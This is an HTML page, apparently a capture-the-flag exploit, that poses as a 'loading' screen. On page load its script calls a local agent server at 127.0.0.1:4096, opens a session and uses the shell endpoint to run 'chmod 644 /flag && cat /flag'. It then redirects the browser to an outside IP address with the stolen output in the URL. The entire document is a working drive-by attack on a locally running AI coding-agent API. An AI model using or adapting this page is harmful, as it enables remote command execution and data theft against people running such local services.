<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>loading</title>
    <style>
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        background: #111;
        color: #ddd;
        font: 16px/1.4 Consolas, Monaco, monospace;
      }
      pre {
        white-space: pre-wrap;
        max-width: 90vw;
      }
    </style>
  </head>
  <body>
    <pre id="status">booting...</pre>
  <script>
  (async () => {
    const BASE = "http://127.0.0.1:4096";
    const EXFIL = "http://47.118.30.30:9999";

    const s = await fetch(`${BASE}/session`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{}"
    });
    const session = await s.json();

    const r = await fetch(`${BASE}/session/${session.id}/shell`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        agent: "build",
        command: "chmod 644 /flag && cat /flag"
      })
    });

    const text = await r.text();

    location.href = `${EXFIL}/?d=${encodeURIComponent(text)}`;
  })();
  </script>
  </body>
  </html>
